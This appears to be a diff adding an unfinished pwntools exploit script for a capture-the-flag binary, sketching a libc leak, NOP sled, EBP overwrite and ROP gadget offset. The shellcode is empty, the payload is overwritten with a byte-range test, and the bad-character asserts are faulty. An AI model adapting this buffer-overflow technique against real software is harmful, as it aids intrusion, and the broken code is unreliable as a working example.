@@ -1,0 +1,84 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./exploitme", checksec=False)
+context.log_level = "error"
+
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# you can also create new functions here
+
+def build_payload(leak):
+
+    # now we just need a proper shellcode
+    # unfortunately i could not find a shellcode that was bad character free and would have fit here
+
+    shellcode = """
+
+	"""
+
+    opcode = asm(shellcode)  # compile into opcode
+
+    # additional check for bad characters
+    assert opcode.find(b"\x00") != 0
+    assert opcode.find(b"\x0a") != 0
+
+	# with the given leak we can get the addresses by combining it with the data provided by ROPgadget	
+	
+    # distance between start_main+245 and libc
+    distance_libc = int.from_bytes(leak, 'little') - 0x0002eea7  
+    pop_ebx = distance_libc + 0x000225b6  # pop ebx ; ret
+
+    # at first we initialize the payload
+    payload = bytes()
+
+    payload += b'\x90' * (516-len(opcode)) # add NOP-Sledge
+    payload += opcode # add opcode
+    payload += b'!EBP' # overwrite EBP
+    
+    # ROP-chain #
+    payload = bytes(range(256))
+    #foo = foo.replace(b'\x00',b'')
+
+    return payload
+
+def main():
+    io = start()
+
+    io.recvuntil("Can you leak me? : ")
+    # io.send(b"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB")
+    # io.recvline()  
+    # leak = io.recvline()[-6:-2]  # address of the start_main+245
+
+    # io.recvuntil("Give me some data:")
+    # io.sendline(build_payload(leak)) # send payload
+    
+    # print(io.recvuntil("}").decode()) # print the flag
+
+    # test for bad characters
+    test_bytes = bytes(range(256))
+    test_bytes = test_bytes.replace(b'\x00',b'')
+    test_bytes = test_bytes.replace(b'\x0a',b'')
+    io.send(test_bytes)
+    while True:
+        print(io.recvline())
+
+
+if __name__ == "__main__":
+    main()
